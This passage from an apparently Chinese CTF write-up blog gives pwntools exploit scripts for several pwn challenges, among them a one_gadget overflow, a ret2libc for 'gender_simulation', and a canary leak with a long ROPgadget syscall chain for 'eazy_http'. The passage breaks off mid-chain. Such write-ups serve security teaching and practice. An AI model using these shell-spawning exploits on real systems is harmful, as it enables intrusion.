class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&quot;pwn_patched&quot;</span><br>libcname = <span class="hljs-string">&quot;/home/zhangjuncpp/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6_2.27-3ubuntu1.6_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>host = <span class="hljs-string">&quot;47.94.155.240&quot;</span><br>port = <span class="hljs-number">22636</span><br>elf = context.binary = ELF(filename)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b main</span><br><span class="hljs-string"></span><br><span class="hljs-string">b *(0x400b6b)</span><br><span class="hljs-string">set debug-file-directory /home/zhangjuncpp/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6-dbg_2.27-3ubuntu1.6_amd64/usr/lib/debug</span><br><span class="hljs-string">set directories /home/zhangjuncpp/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/glibc-source_2.27-3ubuntu1.6_all/usr/src/glibc/glibc-2.27</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br>    <span class="hljs-keyword">elif</span> args.REMOTE:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br>pop_rdi = <span class="hljs-number">0x400df3</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br><br><br>io = start()<br>io.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;Invalid\n&quot;</span>)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; puts: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>libc.address = puts_addr - libc.sym.puts<br>one_gadget = libc.address + <span class="hljs-number">0x4f302</span><br>system_addr = libc.address + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc.address + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; puts: <span class="hljs-subst">&#123;p16(<span class="hljs-number">526</span>+<span class="hljs-number">5</span>)&#125;</span>&quot;</span>)<br>io.send(<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">4</span>)<br>pause(<span class="hljs-number">1</span>)<br>rop_chain = p64(one_gadget)<br>str1 = (<span class="hljs-string">b&quot;KEY: &quot;</span>+ <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">19</span>+p16(<span class="hljs-number">526</span>+<span class="hljs-number">5</span>) + <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">8</span> + rop_chain).ljust(<span class="hljs-number">512</span> ,<span class="hljs-string">b&quot;d&quot;</span>)<br>payload = (<span class="hljs-string">b&quot;VAL: &quot;</span>).ljust(<span class="hljs-number">512</span> ,<span class="hljs-string">b&quot;d&quot;</span>)<br>io.send(str1)<br>pause(<span class="hljs-number">1</span>)<br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="gender-simulation"><a href="#gender-simulation" class="headerlink" title="gender_simulation"></a>gender_simulation</h2><p>女汉子<code>Tomboy</code>选项有漏洞(为什么不是南梁选项😭)，会将接收到的字符串当做函数指针调用，篡改至<code>gender</code>函数后打ret2libc即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: GeekCmore</span><br><span class="hljs-string">    time: 2025-01-17 11:28:01</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&quot;pwn_patched&quot;</span><br>libcname = <span class="hljs-string">&quot;/home/zhangjuncpp/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>host = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port = <span class="hljs-number">1337</span><br>elf = context.binary = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *(0x402EA9)</span><br><span class="hljs-string">b *(0x4025e6)</span><br><span class="hljs-string">set debug-file-directory /home/zhangjuncpp/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6-dbg_2.39-0ubuntu8.3_amd64/usr/lib/debug</span><br><span class="hljs-string">set directories /home/zhangjuncpp/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/glibc-source_2.39-0ubuntu8.3_all/usr/src/glibc/glibc-2.39</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br>    <span class="hljs-keyword">elif</span> args.REMOTE:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br>io = start()<br>io.recvuntil(<span class="hljs-string">b&quot;gift: &quot;</span>)<br>gift = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>libc_base = gift - libc.sym[<span class="hljs-string">&quot;setvbuf&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>log.success(<span class="hljs-string">f&quot;libc_base&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;Girl\n&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;Tomboy\n&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>back_addr = <span class="hljs-number">0x4025e6</span><br>io.sendlineafter(<span class="hljs-string">b&quot;certificate\n&quot;</span>, p64(back_addr))<br>pop_rdi = <span class="hljs-number">0x10f75b</span> + libc_base<br>ret = pop_rdi + <span class="hljs-number">1</span><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x10</span> + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)<br>io.sendafter(<span class="hljs-string">b&quot;certificate&quot;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="eazy-http"><a href="#eazy-http" class="headerlink" title="eazy_http"></a>eazy_http</h2><p>本题主要难点是逆向，pwn漏洞点属于签到题级别，我觉得这题应该出RE()<br>注意到不仅没给libc，甚至整个程序都没有plt表和got表。这实际上是因为程序直接重写了libc的函数并写死在程序里，然后剥离符号表，提高了逆向难度。<br>逆向分析部分参考这位大佬的题解：<a href="https://xz.aliyun.com/news/16600">https://xz.aliyun.com/news/16600</a><br>不过我调试时一直只有一个进程，与上述题解情况不同，可能是我的环境问题吧。<br>漏洞点是栈溢出。注意，程序实际上是有canary保护的，需要常规方法泄露canary后再打一次。由于缺失libc，这里的ROP需要利用syscall打，ROP链很长，但基本不用自己写，<strong>ROPgadget一把梭即可</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./attachment --ropchain<br></code></pre></td></tr></table></figure><p>这里还有一个问题，在解析路径时会把路径存到栈上，可我们的ROP部分毁坏了栈，需要弄个长点的pop绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><br>e = ELF(<span class="hljs-string">&quot;./attachment&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./attachment&quot;</span>)<br><span class="hljs-comment"># io = gdb.debug(&quot;./attachment&quot;, &quot;&quot;&quot;b *(0x40218f)</span><br><span class="hljs-comment">#                b *(0x401f71)</span><br><span class="hljs-comment">#                b *(0x401bd1)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br><br>template = <span class="hljs-string">&#x27;&#x27;&#x27;POST /&#123;&#125; HTTP/1.1\r</span><br><span class="hljs-string">Host: www.baidu.com\r</span><br><span class="hljs-string">User-Agent: Haha\r</span><br><span class="hljs-string">Content-Length: &#123;&#125;\r</span><br><span class="hljs-string">Content: &#123;&#125;\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    command = [<span class="hljs-string">&quot;ps&quot;</span>, <span class="hljs-string">&quot;-ax&quot;</span>]<br>    grep_command = [<span class="hljs-string">&quot;grep&quot;</span>, <span class="hljs-string">&quot;attachment&quot;</span>]<br>    <span class="hljs-comment"># 执行 ps 命令</span><br>    ps_process = subprocess.Popen(command, stdout=subprocess.PIPE)<br>    <span class="hljs-comment"># 将 ps 命令的输出作为 grep 命令的输入</span><br>    grep_process = subprocess.Popen(grep_command, stdin=ps_process.stdout, stdout=subprocess.PIPE)<br>    <span class="hljs-comment"># 允许 ps 命令的输出流直接传递到 grep 命令</span><br>    ps_process.stdout.close()<br>    <span class="hljs-comment"># 获取最终输出   </span><br>    output = grep_process.communicate()[<span class="hljs-number">0</span>]<br>    pid=<span class="hljs-built_in">int</span>(output.decode().split()[<span class="hljs-number">5</span>],<span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;pid:<span class="hljs-subst">&#123;pid&#125;</span>&quot;</span>)<br>    attach(pid)<br>    pause()<br>    <br>payload1=template.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;show&quot;</span>, <span class="hljs-number">0x109</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x109</span>).encode()<br><br><span class="hljs-comment"># debug()</span><br><span class="hljs-comment"># pause()</span><br>io.send(payload1)<br>io.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x108</span>)<br>canary = u64(io.recv(<span class="hljs-number">8</span>)) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;canary:<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br><br>bss = <span class="hljs-number">0x4e8b70</span><br><br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>pop_r12_r13_r14_r15_rbp=<span class="hljs-number">0x000000000040545d</span><br>p=p64(pop_r12_r13_r14_r15_rbp)+(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x15</span> + <span class="hljs-string">b&#x27;/add\x00&#x27;</span>).ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a9ee</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000459227</span>) <span class="hljs-comment"># pop rax ; ret</span><br>p += <span class="hljs-string">b&#x27;/bin//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000045b995</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a9ee</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000447279</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000045b995</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040297f</span>) <span class="hljs-comment"># pop rdi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a9ee</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004a4c4b</span>) <span class="hljs-comment"># pop rdx ; pop rbx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x4141414141414141</span>) <span class="hljs-comment"># padding</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000447279</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000402734</span>) 